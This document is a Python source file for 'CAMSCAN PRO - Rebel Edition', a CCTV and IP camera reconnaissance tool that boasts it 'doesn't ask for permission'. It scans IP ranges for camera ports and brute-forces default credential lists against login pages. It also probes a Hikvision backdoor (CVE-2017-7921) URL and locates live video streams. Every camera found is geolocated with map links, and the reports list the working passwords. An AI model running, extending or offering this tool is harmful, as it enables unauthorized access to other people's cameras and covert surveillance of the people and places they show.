#!/usr/bin/env python3
"""
CAMSCAN PRO - Advanced CCTV & IP Camera Reconnaissance Toolkit
Rebel Edition - Because security shouldn't be a suggestion, it should be a reality.

Author: Md. Abu Naser Khan
Version: 1.0
License: MIT
"""

import asyncio
import aiohttp
import socket
import ssl
import json
import re
import ipaddress
import concurrent.futures
from urllib.parse import urljoin, urlparse
from typing import Dict, List, Optional, Tuple, Any
import requests
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
import threading
import time
import random
from dataclasses import dataclass
import urllib3
import base64
import hashlib
from xml.etree import ElementTree
import logging
import argparse
import sys
import os
from pathlib import Path
import csv
import xml.etree.ElementTree as ET
from datetime import datetime

# Disable SSL warnings for rebel operations
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

@dataclass
class CameraPort:
    port: int
    protocol: str
    description: str
    common_brands: List[str]

@dataclass
class CameraBrand:
    name: str
    default_credentials: List[Tuple[str, str]]
    common_ports: List[int]
    user_agents: List[str]
    login_patterns: List[str]
    stream_paths: List[str]
    vulnerabilities: List[str]

@dataclass
class ScanResult:
    ip: str
    port: int
    protocol: str
    service: str
    banner: str
    requires_auth: bool
    camera_brand: str
    model: str
    login_url: str
    stream_url: str
    credentials: List[Tuple[str, str]]
    location_info: Dict[str, Any]
    vulnerabilities: List[str]
    headers: Dict[str, str]
    response_time: float
    geo_location: Dict[str, Any]

class CamScanPro:
    """
    The ultimate CCTV reconnaissance tool that doesn't ask for permission.
    Built for researchers who understand that knowledge is the only true power.
    """
    
    def __init__(self, max_threads: int = 50, timeout: int = 10, user_agent: str = None, 
                 output_dir: str = "reports", rate_limit: float = 0.1):
        self.max_threads = max_threads
        self.timeout = timeout
        self.user_agent = user_agent or "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        self.output_dir = Path(output_dir)
        self.rate_limit = rate_limit
        
        # Create output directory
        self.output_dir.mkdir(exist_ok=True)
        
        # Comprehensive port list
        self.camera_ports = self._initialize_ports()
        self.camera_brands = self._initialize_brands()
        self.session = self._create_session()
        
        # Progress tracking
        self.scanned_ports = 0
        self.total_ports = 0
        self.found_cameras = []
        self.lock = threading.Lock()
        
    def _initialize_ports(self) -> List[CameraPort]:
        """Initialize the massive port database"""
        ports = [
            # HTTP/HTTPS ports
            CameraPort(80, "http", "Standard HTTP", ["All Brands"]),
            CameraPort(443, "https", "Standard HTTPS", ["All Brands"]),
            CameraPort(8080, "http", "Alternative HTTP", ["Hikvision", "Dahua", "Axis"]),
            CameraPort(8443, "https", "Alternative HTTPS", ["Hikvision", "Dahua"]),
            CameraPort(8000, "http", "Common CCTV HTTP", ["Hikvision", "Dahua", "CP Plus"]),
            
            # RTSP ports
            CameraPort(554, "rtsp", "Standard RTSP", ["All Brands"]),
            CameraPort(5554, "rtsp", "Alternative RTSP", ["Hikvision", "Dahua"]),
            CameraPort(8554, "rtsp", "Alternative RTSP", ["Various"]),
            
            # RTMP ports
            CameraPort(1935, "rtmp", "Standard RTMP", ["Various"]),
            
            # ONVIF ports
            CameraPort(80, "onvif", "ONVIF HTTP", ["All ONVIF Compliant"]),
            CameraPort(443, "onvif", "ONVIF HTTPS", ["All ONVIF Compliant"]),
            CameraPort(3702, "onvif", "ONVIF Discovery", ["All ONVIF Compliant"]),
            
            # Specialized camera ports
            CameraPort(81, "http", "Alternative Web", ["Dahua", "Hikvision"]),
            CameraPort(82, "http", "Alternative Web", ["Various"]),
            CameraPort(83, "http", "Alternative Web", ["Various"]),
            CameraPort(84, "http", "Alternative Web", ["Various"]),
            CameraPort(85, "http", "Alternative Web", ["Various"]),
            
            # DVR/NVR specific ports
            CameraPort(37777, "tcp", "Dahua DVR", ["Dahua"]),
            CameraPort(37778, "tcp", "Dahua Mobile", ["Dahua"]),
            CameraPort(34567, "tcp", "Hikvision DVR", ["Hikvision"]),
            CameraPort(6036, "tcp", "CP Plus DVR", ["CP Plus"]),
        ]
        
        # Add high ports for comprehensive scanning
        high_ports = [8000, 8080, 8081, 8082, 8088, 8888, 8090, 9000, 9001, 10000]
        for port in high_ports:
            if port not in [p.port for p in ports]:
                ports.append(CameraPort(port, "http", f"High HTTP {port}", ["Various"]))
                
        return ports
    
    def _initialize_brands(self) -> Dict[str, CameraBrand]:
        """Initialize the camera brand database with extensive default credentials and vulnerabilities"""
        return {
            "Hikvision": CameraBrand(
                name="Hikvision",
                default_credentials=[
                    ("admin", "12345"), ("admin", "123456"), 
                    ("admin", "admin"), ("admin", "password"),
                    ("", ""), ("admin", "Admin123")
                ],
                common_ports=[80, 443, 8000, 8080, 554, 34567],
                user_agents=["Hikvision", "Hik-Webs"],
                login_patterns=[r"hikvision", r"Hikvision", r"Web Video Server"],
                stream_paths=[
                    "/ISAPI/Streaming/channels/101", 
                    "/Streaming/Channels/101",
                    "/onvif/device_service"
                ],
                vulnerabilities=[
                    "CVE-2017-7921 - Backdoor access",
                    "CVE-2021-36260 - Command injection",
                    "Default credentials vulnerability"
                ]
            ),
            "Dahua": CameraBrand(
                name="Dahua",
                default_credentials=[
                    ("admin", "admin"), ("admin", "123456"), 
                    ("admin", "111111"), ("admin", "888888"),
                    ("admin", "dahua"), ("", "")
                ],
                common_ports=[80, 443, 8080, 37777, 554],
                user_agents=["Dahua", "DHI-WEB", "WebService"],
                login_patterns=[r"dahua", r"Dahua", r"DHIP"],
                stream_paths=[
                    "/cam/realmonitor", 
                    "/cgi-bin/realmonitor",
                    "/onvif/device_service"
                ],
                vulnerabilities=[
                    "CVE-2021-33044 - Authentication bypass",
                    "CVE-2022-30563 - OS command injection",
                    "Default credentials vulnerability"
                ]
            ),
            "CP Plus": CameraBrand(
                name="CP Plus",
                default_credentials=[
                    ("admin", "admin"), ("admin", "123456"), 
                    ("admin", "cpplus"), ("admin", "CPPlus123"),
                    ("", ""), ("admin", "password")
                ],
                common_ports=[80, 443, 8000, 6036, 554],
                user_agents=["CP Plus", "CPPLUS", "WebService"],
                login_patterns=[r"CP Plus", r"CPPLUS", r"Security Management System"],
                stream_paths=[
                    "/streaming/channels/1", 
                    "/live.sdp",
                    "/onvif/device_service"
                ],
                vulnerabilities=[
                    "Default credentials vulnerability",
                    "Information disclosure vulnerability"
                ]
            ),
            "Generic": CameraBrand(
                name="Generic",
                default_credentials=[
                    ("admin", "admin"), ("admin", "1234"), 
                    ("admin", "12345"), ("admin", "password"),
                    ("root", "root"), ("", "")
                ],
                common_ports=[80, 443, 8080, 554, 1935],
                user_agents=[],
                login_patterns=[r"login", r"Login", r"IP Camera"],
                stream_paths=[
                    "/video", "/stream", "/live", 
                    "/media", "/onvif/device_service"
                ],
                vulnerabilities=["Default credentials vulnerability"]
            )
        }
    
    def _create_session(self) -> requests.Session:
        """Create a robust HTTP session with retry strategy"""
        session = requests.Session()
        retry_strategy = Retry(
            total=3,
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504],
        )
        adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=100, pool_maxsize=100)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        session.headers.update({
            'User-Agent': self.user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        })
        return session
    
    async def scan_ip(self, target_ip: str, custom_ports: List[int] = None) -> List[ScanResult]:
        """
        Main scanning function - Scans an IP address for exposed CCTV cameras
        """
        logger.info(f"🚀 Initiating comprehensive scan on {target_ip}")
        
        # Validate IP address
        if not self._validate_ip(target_ip):
            logger.error(f"❌ Invalid IP address: {target_ip}")
            return []
        
        # Determine which ports to scan
        ports_to_scan = [cp.port for cp in self.camera_ports]
        if custom_ports:
            ports_to_scan.extend(custom_ports)
        
        # Remove duplicates and sort
        ports_to_scan = sorted(set(ports_to_scan))
        self.total_ports = len(ports_to_scan)
        self.scanned_ports = 0
        self.found_cameras = []
        
        logger.info(f"🎯 Scanning {self.total_ports} ports on {target_ip}")
        
        # Multi-threaded port scanning with rate limiting
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = {
                executor.submit(self._check_port, target_ip, port): port 
                for port in ports_to_scan
            }
            
            for future in concurrent.futures.as_completed(futures):
                try:
                    result = future.result()
                    if result:
                        with self.lock:
                            self.found_cameras.append(result)
                    time.sleep(self.rate_limit)  # Rate limiting
                except Exception as e:
                    port = futures[future]
                    logger.error(f"Error scanning port {port}: {e}")
        
        # Enhanced analysis on found services
        enhanced_results = []
        for result in self.found_cameras:
            enhanced_result = await self._enhance_scan_result(result)
            enhanced_results.append(enhanced_result)
        
        logger.info(f"✅ Scan completed. Found {len(enhanced_results)} potential camera services")
        return enhanced_results
    
    def _validate_ip(self, ip: str) -> bool:
        """Validate IP address format"""
        try:
            ipaddress.ip_address(ip)
            return True
        except ValueError:
            return False
    
    def _check_port(self, ip: str, port: int) -> Optional[ScanResult]:
        """Check if a port is open and potentially running a camera service"""
        try:
            start_time = time.time()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            result = sock.connect_ex((ip, port))
            response_time = time.time() - start_time
            sock.close()
            
            if result == 0:
                logger.info(f"🔍 Port {port} is open on {ip} (Response: {response_time:.2f}s)")
                return self._analyze_service(ip, port, response_time)
        except Exception as e:
            logger.debug(f"Error checking port {port}: {e}")
        
        self.scanned_ports += 1
        self._print_progress()
        return None
    
    def _analyze_service(self, ip: str, port: int, response_time: float) -> Optional[ScanResult]:
        """Analyze the service running on an open port"""
        try:
            protocol = "http"
            if port == 443 or port == 8443:
                protocol = "https"
            
            base_url = f"{protocol}://{ip}:{port}"
            start_time = time.time()
            
            # Check for web interface with timeout
            response = self.session.get(base_url, timeout=self.timeout, verify=False)
            total_response_time = time.time() - start_time
            
            if response.status_code == 200:
                # Analyze response for camera indicators
                camera_brand = self._identify_camera_brand(response.text, response.headers)
                requires_auth = self._check_authentication(response)
                
                result = ScanResult(
                    ip=ip,
                    port=port,
                    protocol=protocol,
                    service="HTTP/HTTPS",
                    banner=response.headers.get('Server', 'Unknown'),
                    requires_auth=requires_auth,
                    camera_brand=camera_brand,
                    model=self._extract_model(response.text),
                    login_url=base_url,
                    stream_url="",
                    credentials=[],
                    location_info={},
                    vulnerabilities=[],
                    headers=dict(response.headers),
                    response_time=total_response_time,
                    geo_location={}
                )
                
                # If it's a camera, enhance the result
                if camera_brand or self._is_camera_interface(response.text):
                    logger.info(f"📹 Found potential camera: {camera_brand} on {ip}:{port}")
                    return result
            
            # Check for RTSP
            if self._check_rtsp(ip, port):
                return ScanResult(
                    ip=ip,
                    port=port,
                    protocol="rtsp",
                    service="RTSP Stream",
                    banner="RTSP Server",
                    requires_auth=False,
                    camera_brand="Unknown",
                    model="",
                    login_url="",
                    stream_url=f"rtsp://{ip}:{port}/",
                    credentials=[],
                    location_info={},
                    vulnerabilities=[],
                    headers={},
                    response_time=response_time,
                    geo_location={}
                )
                
        except requests.RequestException as e:
            logger.debug(f"HTTP analysis failed for {ip}:{port}: {e}")
        except Exception as e:
            logger.error(f"Unexpected error analyzing {ip}:{port}: {e}")
        
        self.scanned_ports += 1
        self._print_progress()
        return None
    
    def _identify_camera_brand(self, html_content: str, headers: Dict) -> str:
        """Identify camera brand from HTML content and headers"""
        html_lower = html_content.lower()
        
        for brand_name, brand_data in self.camera_brands.items():
            # Check HTML content
            for pattern in brand_data.login_patterns:
                if re.search(pattern, html_content, re.IGNORECASE):
                    return brand_name
            
            # Check headers
            server_header = headers.get('Server', '').lower()
            for user_agent in brand_data.user_agents:
                if user_agent.lower() in server_header:
                    return brand_name
        
        return "Unknown"
    
    def _is_camera_interface(self, html_content: str) -> bool:
        """Determine if the HTML content looks like a camera interface"""
        camera_indicators = [
            r'camera', r'video', r'stream', r'surveillance', r'security',
            r'ip camera', r'web service', r'live view', r'realtime',
            r'ptz', r'pan', r'tilt', r'zoom', r'motion detection'
        ]
        
        html_lower = html_content.lower()
        matches = sum(1 for indicator in camera_indicators if re.search(indicator, html_lower))
        
        return matches >= 2
    
    def _check_authentication(self, response) -> bool:
        """Check if the service requires authentication"""
        auth_indicators = [
            response.status_code == 401,
            response.status_code == 403,
            'login' in response.url.lower(),
            'password' in response.text.lower(),
            'authentication' in response.text.lower(),
        ]
        
        return any(auth_indicators)
    
    def _check_rtsp(self, ip: str, port: int) -> bool:
        """Check if RTSP service is running on the port"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((ip, port))
            
            # Send OPTIONS request
            request = f"OPTIONS rtsp://{ip}/ RTSP/1.0\r\nCSeq: 1\r\n\r\n"
            sock.send(request.encode())
            
            response = sock.recv(1024).decode()
            sock.close()
            
            return 'RTSP' in response or 'rtsp' in response
            
        except Exception:
            return False
    
    def _extract_model(self, html_content: str) -> str:
        """Extract camera model from HTML content"""
        model_patterns = [
            r'model[:\s]*([^\s<]+)',
            r'product[:\s]*([^\s<]+)',
            r'device[:\s]*([^\s<]+)',
            r'camera[:\s]*([^\s<]+)',
            r'<title>([^<]+)</title>'
        ]
        
        for pattern in model_patterns:
            match = re.search(pattern, html_content, re.IGNORECASE)
            if match:
                return match.group(1).strip()
        
        return "Unknown"
    
    async def _enhance_scan_result(self, result: ScanResult) -> ScanResult:
        """Enhance scan result with additional information"""
        try:
            # Get location information
            result.location_info = await self._get_ip_location(result.ip)
            result.geo_location = await self._get_geolocation(result.ip)
            
            # Test for default credentials if authentication is required
            if result.requires_auth and result.camera_brand != "Unknown":
                result.credentials = await self._test_default_credentials(result)
            
            # Find stream URLs
            result.stream_url = await self._find_stream_urls(result)
            
            # Check for vulnerabilities
            result.vulnerabilities = await self._check_vulnerabilities(result)
            
        except Exception as e:
            logger.error(f"Error enhancing result for {result.ip}:{result.port}: {e}")
        
        return result
    
    async def _get_ip_location(self, ip: str) -> Dict[str, Any]:
        """Get IP geolocation information"""
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f"http://ip-api.com/json/{ip}") as response:
                    data = await response.json()
                    
                    if data.get('status') == 'success':
                        return {
                            'country': data.get('country', 'Unknown'),
                            'region': data.get('regionName', 'Unknown'),
                            'city': data.get('city', 'Unknown'),
                            'zip': data.get('zip', 'Unknown'),
                            'lat': data.get('lat', 0),
                            'lon': data.get('lon', 0),
                            'isp': data.get('isp', 'Unknown'),
                            'org': data.get('org', 'Unknown'),
                        }
        except Exception as e:
            logger.debug(f"Could not get location for {ip}: {e}")
        
        return {}
    
    async def _get_geolocation(self, ip: str) -> Dict[str, Any]:
        """Get detailed geolocation information"""
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f"http://ipapi.co/{ip}/json/") as response:
                    data = await response.json()
                    return {
                        'google_maps': f"https://maps.google.com/?q={data.get('latitude', 0)},{data.get('longitude', 0)}",
                        'google_earth': f"https://earth.google.com/web/@{data.get('latitude', 0)},{data.get('longitude', 0)}",
                        'latitude': data.get('latitude', 0),
                        'longitude': data.get('longitude', 0),
                    }
        except Exception:
            return {}
    
    async def _test_default_credentials(self, result: ScanResult) -> List[Tuple[str, str]]:
        """Test default credentials on the camera login"""
        working_credentials = []
        brand = self.camera_brands.get(result.camera_brand, self.camera_brands["Generic"])
        
        # Test each credential combination with rate limiting
        for username, password in brand.default_credentials:
            if await self._try_login(result.login_url, username, password):
                working_credentials.append((username, password))
                logger.info(f"🔑 Found working credentials: {username}:{password} on {result.ip}")
            await asyncio.sleep(0.1)  # Rate limiting between login attempts
        
        return working_credentials
    
    async def _try_login(self, login_url: str, username: str, password: str) -> bool:
        """Attempt to login with given credentials"""
        try:
            # Try basic auth first
            response = self.session.get(login_url, auth=(username, password), 
                                      timeout=self.timeout, verify=False)
            if response.status_code == 200 and not self._check_authentication(response):
                return True
            
            # Try form-based login
            login_data = {
                'username': username,
                'password': password,
                'user': username,
                'pass': password,
                'login': 'Login',
                'submit': 'Submit'
            }
            
            response = self.session.post(login_url, data=login_data, 
                                       timeout=self.timeout, verify=False)
            if response.status_code == 200 and not self._check_authentication(response):
                return True
                
        except Exception as e:
            logger.debug(f"Login attempt failed for {username}:{password} on {login_url}: {e}")
        
        return False
    
    async def _find_stream_urls(self, result: ScanResult) -> str:
        """Find live stream URLs for the camera"""
        stream_urls = []
        brand = self.camera_brands.get(result.camera_brand, self.camera_brands["Generic"])
        
        # Test common stream paths
        for path in brand.stream_paths:
            stream_url = f"{result.protocol}://{result.ip}:{result.port}{path}"
            if await self._test_stream_url(stream_url):
                stream_urls.append(stream_url)
        
        # Test RTSP separately
        rtsp_url = f"rtsp://{result.ip}:{result.port}/"
        if await self._test_rtsp_stream(rtsp_url):
            stream_urls.append(rtsp_url)
        
        return ", ".join(stream_urls) if stream_urls else "No streams found"
    
    async def _test_stream_url(self, url: str) -> bool:
        """Test if a stream URL is accessible"""
        try:
            response = self.session.get(url, timeout=5, verify=False, stream=True)
            if response.status_code == 200:
                content = response.content[:100]
                return len(content) > 0
        except Exception:
            pass
        return False
    
    async def _test_rtsp_stream(self, url: str) -> bool:
        """Test if an RTSP stream is accessible"""
        try:
            parsed = urlparse(url)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((parsed.hostname, parsed.port or 554))
            sock.close()
            return result == 0
        except Exception:
            return False
    
    async def _check_vulnerabilities(self, result: ScanResult) -> List[str]:
        """Check for common camera vulnerabilities"""
        vulnerabilities = []
        brand = self.camera_brands.get(result.camera_brand, self.camera_brands["Generic"])
        
        # Add brand-specific vulnerabilities
        vulnerabilities.extend(brand.vulnerabilities)
        
        # General vulnerability checks
        if not result.requires_auth:
            vulnerabilities.append("Unauthenticated access")
        
        if any(cred for cred in result.credentials if not cred[0] or not cred[1]):
            vulnerabilities.append("Empty credentials accepted")
        
        # Check for specific CVEs
        if result.camera_brand == "Hikvision":
            if await self._check_hikvision_backdoor(result):
                vulnerabilities.append("CVE-2017-7921 - Confirmed")
        
        return vulnerabilities
    
    async def _check_hikvision_backdoor(self, result: ScanResult) -> bool:
        """Check for Hikvision backdoor vulnerability"""
        try:
            response = self.session.get(
                f"{result.protocol}://{result.ip}:{result.port}/Security/users?auth=YWRtaW46MTEK",
                timeout=5, verify=False
            )
            return response.status_code == 200
        except:
            return False
    
    def _print_progress(self):
        """Print scanning progress"""
        progress = (self.scanned_ports / self.total_ports) * 100
        print(f"\r📡 Progress: {self.scanned_ports}/{self.total_ports} ports ({progress:.1f}%)", end="", flush=True)
    
    def generate_report(self, results: List[ScanResult], format: str = "markdown") -> str:
        """Generate comprehensive reports in multiple formats"""
        if format == "markdown":
            return self._generate_markdown_report(results)
        elif format == "json":
            return self._generate_json_report(results)
        elif format == "csv":
            return self._generate_csv_report(results)
        else:
            return self._generate_markdown_report(results)
    
    def _generate_markdown_report(self, results: List[ScanResult]) -> str:
        """Generate markdown report"""
        report = []
        report.append("# CAMSCAN PRO - CCTV Reconnaissance Report")
        report.append(f"## Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        report.append(f"## Total Cameras Found: {len(results)}")
        report.append("")
        
        for i, result in enumerate(results, 1):
            report.append(f"## Camera {i}: {result.ip}:{result.port}")
            report.append("```")
            report.append(f"IP Address: {result.ip}")
            report.append(f"Port: {result.port}")
            report.append(f"Protocol: {result.protocol}")
            report.append(f"Service: {result.service}")
            report.append(f"Server: {result.banner}")
            report.append(f"Camera Brand: {result.camera_brand}")
            report.append(f"Model: {result.model}")
            report.append(f"Requires Auth: {result.requires_auth}")
            report.append(f"Response Time: {result.response_time:.2f}s")
            report.append(f"Login URL: {result.login_url}")
            report.append(f"Stream URL: {result.stream_url}")
            report.append("")
            
            if result.credentials:
                report.append("Working Credentials:")
                for username, password in result.credentials:
                    report.append(f"  {username}:{password}")
            else:
                report.append("Working Credentials: None found")
            
            report.append("")
            
            if result.location_info:
                report.append("Location Information:")
                for key, value in result.location_info.items():
                    report.append(f"  {key}: {value}")
            
            report.append("")
            
            if result.vulnerabilities:
                report.append("Vulnerabilities:")
                for vuln in result.vulnerabilities:
                    report.append(f"  ⚠️  {vuln}")
            else:
                report.append("Vulnerabilities: None detected")
            
            report.append("```")
            report.append("")
        
        # Add investigation links
        report.append("## Further Investigation Links")
        report.append("### Shodan Search Links:")
        for result in results:
            report.append(f"- https://www.shodan.io/search?query=ip:{result.ip}")
        
        report.append("")
        report.append("### Google Dorking Suggestions:")
        dorks = [
            f"inurl:/view.shtml {result.ip}",
            f"inurl:/webcam.html {result.ip}",
            f"inurl:/video.mjpg {result.ip}",
            f"intitle:\"webcam\" {result.ip}",
        ]
        for dork in dorks:
            report.append(f"- `{dork}`")
        
        return "\n".join(report)
    
    def _generate_json_report(self, results: List[ScanResult]) -> str:
        """Generate JSON report"""
        report_data = {
            "scan_metadata": {
                "timestamp": datetime.now().isoformat(),
                "total_cameras": len(results),
                "scanner_version": "4.0.0"
            },
            "cameras": []
        }
        
        for result in results:
            camera_data = {
                "ip": result.ip,
                "port": result.port,
                "protocol": result.protocol,
                "service": result.service,
                "banner": result.banner,
                "camera_brand": result.camera_brand,
                "model": result.model,
                "requires_auth": result.requires_auth,
                "login_url": result.login_url,
                "stream_url": result.stream_url,
                "credentials": result.credentials,
                "location_info": result.location_info,
                "vulnerabilities": result.vulnerabilities,
                "response_time": result.response_time
            }
            report_data["cameras"].append(camera_data)
        
        return json.dumps(report_data, indent=2)
    
    def _generate_csv_report(self, results: List[ScanResult]) -> str:
        """Generate CSV report"""
        import io
        import csv
        
        output = io.StringIO()
        writer = csv.writer(output)
        
        # Write header
        writer.writerow([
            'IP', 'Port', 'Protocol', 'Service', 'Brand', 'Model',
            'Requires Auth', 'Login URL', 'Stream URL', 'Credentials',
            'Country', 'City', 'Vulnerabilities', 'Response Time'
        ])
        
        # Write data
        for result in results:
            credentials_str = '; '.join([f"{u}:{p}" for u, p in result.credentials])
            vulnerabilities_str = '; '.join(result.vulnerabilities)
            
            writer.writerow([
                result.ip,
                result.port,
                result.protocol,
                result.service,
                result.camera_brand,
                result.model,
                result.requires_auth,
                result.login_url,
                result.stream_url,
                credentials_str,
                result.location_info.get('country', 'Unknown'),
                result.location_info.get('city', 'Unknown'),
                vulnerabilities_str,
                f"{result.response_time:.2f}"
            ])
        
        return output.getvalue()
    
    def save_report(self, results: List[ScanResult], filename: str = None, format: str = "markdown"):
        """Save report to file"""
        if not filename:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"camscan_report_{timestamp}.{format}"
        
        filepath = self.output_dir / filename
        report_content = self.generate_report(results, format)
        
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(report_content)
        
        logger.info(f"📄 Report saved to: {filepath}")
        return filepath

class AdvancedScanModes:
    """Advanced scanning modes for specialized reconnaissance"""
    
    @staticmethod
    async def network_scan(network_cidr: str, max_threads: int = 100) -> List[str]:
        """Scan an entire network range for active hosts"""
        try:
            network = ipaddress.ip_network(network_cidr, strict=False)
            active_ips = []
            
            logger.info(f"🌐 Scanning network {network_cidr} ({network.num_addresses} addresses)")
            
            with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
                futures = {
                    executor.submit(AdvancedScanModes._ping_ip, str(ip)): str(ip) 
                    for ip in network.hosts()
                }
                
                for future in concurrent.futures.as_completed(futures):
                    ip = futures[future]
                    try:
                        if future.result():
                            active_ips.append(ip)
                            logger.info(f"✅ Active host found: {ip}")
                    except Exception as e:
                        logger.debug(f"Error pinging {ip}: {e}")
            
            return active_ips
        except ValueError as e:
            logger.error(f"Invalid network CIDR: {e}")
            return []
    
    @staticmethod
    def _ping_ip(ip: str) -> bool:
        """Ping an IP address to check if it's active"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((ip, 80))
            sock.close()
            return result == 0
        except:
            return False

def setup_argparse() -> argparse.ArgumentParser:
    """Setup command line argument parser"""
    parser = argparse.ArgumentParser(
        description="CAMSCAN PRO - Advanced CCTV Reconnaissance Toolkit",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python camscan_pro.py 192.168.1.1
  python camscan_pro.py 192.168.1.0/24 --format json
  python camscan_pro.py 192.168.1.1 --threads 100 --timeout 5
  python camscan_pro.py targets.txt --output detailed_report
        """
    )
    
    parser.add_argument('target', help='Target IP, network CIDR, or file containing targets')
    parser.add_argument('-t', '--threads', type=int, default=50, help='Number of threads (default: 50)')
    parser.add_argument('--timeout', type=int, default=10, help='Timeout in seconds (default: 10)')
    parser.add_argument('-o', '--output', help='Output filename')
    parser.add_argument('-f', '--format', choices=['markdown', 'json', 'csv'], 
                       default='markdown', help='Output format (default: markdown)')
    parser.add_argument('--rate-limit', type=float, default=0.1, 
                       help='Rate limit between requests (default: 0.1)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    
    return parser

async def main():
    """Main execution function"""
    parser = setup_argparse()
    args = parser.parse_args()
    
    # Set logging level
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    print("""
    ╔══════════════════════════════════════════════════════════════╗
    ║                   CAMSCAN PRO - REBEL EDITION                ║
    ║                 Advanced CCTV Reconnaissance                ║
    ║                                                              ║
    ║  Because security research shouldn't have boundaries        ║
    ╚══════════════════════════════════════════════════════════════╝
    """)
    
    # Initialize scanner
    scanner = CamScanPro(
        max_threads=args.threads,
        timeout=args.timeout,
        rate_limit=args.rate_limit
    )
    
    all_results = []
    
    # Process target(s)
    if '/' in args.target:
        # Network scan
        logger.info(f"🔍 Performing network scan on {args.target}")
        active_ips = await AdvancedScanModes.network_scan(args.target, args.threads)
        logger.info(f"🌐 Found {len(active_ips)} active hosts")
        
        for ip in active_ips:
            try:
                results = await scanner.scan_ip(ip)
                all_results.extend(results)
            except Exception as e:
                logger.error(f"Error scanning {ip}: {e}")
    
    elif os.path.isfile(args.target):
        # File with targets
        logger.info(f"📁 Reading targets from file: {args.target}")
        with open(args.target, 'r') as f:
            targets = [line.strip() for line in f if line.strip()]
        
        for target in targets:
            if '/' in target:
                # Network in file
                active_ips = await AdvancedScanModes.network_scan(target, args.threads)
                for ip in active_ips:
                    try:
                        results = await scanner.scan_ip(ip)
                        all_results.extend(results)
                    except Exception as e:
                        logger.error(f"Error scanning {ip}: {e}")
            else:
                # Single IP in file
                try:
                    results = await scanner.scan_ip(target)
                    all_results.extend(results)
                except Exception as e:
                    logger.error(f"Error scanning {target}: {e}")
    else:
        # Single IP
        try:
            all_results = await scanner.scan_ip(args.target)
        except Exception as e:
            logger.error(f"Error scanning {args.target}: {e}")
            return
    
    # Generate and save report
    if all_results:
        filename = scanner.save_report(all_results, args.output, args.format)
        
        # Print summary
        print(f"\n🎯 Scan Summary:")
        print(f"📹 Total cameras found: {len(all_results)}")
        print(f"📄 Report saved to: {filename}")
        
        for result in all_results:
            auth_status = "🔓 Open" if not result.requires_auth else "🔐 Authenticated"
            cred_status = f" ({len(result.credentials)} creds)" if result.credentials else ""
            print(f"   {result.ip}:{result.port} - {result.camera_brand} - {auth_status}{cred_status}")
    else:
        print("❌ No cameras found during scan.")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n⏹️  Scan interrupted by user")
    except Exception as e:
        print(f"💥 Unexpected error: {e}")
        sys.exit(1)